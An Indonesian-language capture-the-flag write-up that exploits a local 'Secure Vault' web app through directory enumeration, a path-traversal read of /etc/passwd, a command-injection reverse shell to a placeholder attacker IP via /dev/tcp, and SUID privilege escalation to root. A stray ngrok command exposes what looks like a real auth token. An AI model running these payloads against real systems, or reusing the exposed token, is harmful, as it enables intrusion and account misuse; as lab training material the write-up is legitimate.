# WITEUP
___

Step 1: Memeriksa Web Aplikasi

    Akses web aplikasi pada http://localhost:8080. Di sini, kita akan melihat halaman login untuk aplikasi Secure Vault.
    Melakukan brute force terhadap form login tidak terlalu praktis, jadi kita coba melihat fitur lain yang mungkin rentan.


Step 2: Mencari Celah di URL

Cobalah melakukan directory brute force menggunakan tools seperti dirbuster atau gobuster untuk melihat endpoint tersembunyi.

gobuster dir -u http://localhost:8080 -w /path/to/wordlist.txt

ngrok config add-authtoken 2Wgkacup8yGJHzXNJzotU_5JDtsSTuT813x1uBDZH6H

Hasilnya, ditemukan beberapa endpoint:

    /debug
    /admin
    /run

Step 3: Eksploitasi Local File Inclusion (LFI)

Endpoint /debug memiliki celah Local File Inclusion. Kita bisa menyertakan file yang ada di server menggunakan parameter file.

Contoh: akses /debug?file=../../../../etc/passwd untuk membaca file /etc/passwd yang ada di server.

curl "http://localhost:8080/debug?file=../../../../etc/passwd"


Outputnya menampilkan file /etc/passwd:

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
vaultuser:x:1000:1000::/home/vaultuser:/bin/bash
...


Step 4: Command Injection dan Reverse Shell

Endpoint /run rentan terhadap command injection. Kita bisa menjalankan command berbahaya langsung melalui parameter cmd. Untuk mendapatkan reverse shell, kirim command berikut ke server menggunakan netcat.

    Jalankan listener di host attacker (misalnya di port 1234):

nc -lvnp 1234

Di server target, kirim reverse shell:

    curl "http://localhost:8080/run?cmd=bash -i >& /dev/tcp/<attacker_ip>/1234 0>&1"


Sekarang kita mendapatkan shell sebagai user vaultuser di server.

Step 5: Mencari File dengan Permission SUID

Setelah mendapatkan shell, kita bisa mencoba Privilege Escalation. Kita lakukan pencarian file SUID (file yang bisa dijalankan dengan hak akses root).

Gunakan command berikut untuk mencari file SUID di sistem:

find / -perm -u=s -type f 2>/dev/null


Hasil pencarian:

/usr/local/bin/suid-bin


Step 6: Eskalasi Privilege ke Root

File /usr/local/bin/suid-bin adalah file biner yang bisa kita jalankan dengan hak akses root. Karena ini adalah custom script yang memanggil /bin/bash, kita bisa menggunakannya untuk mendapatkan akses root.

Jalankan command ini:

/usr/local/bin/suid-bin


Sekarang kita memiliki shell sebagai root. Dari sini, kita bisa mengakses flag yang ada di direktori /root.

Step 7: Ambil Flag

Terakhir, kita bisa membaca flag di /root/flag.txt:

cat /root/flag.txt


Flag:

CTF{You_Got_The_Flag}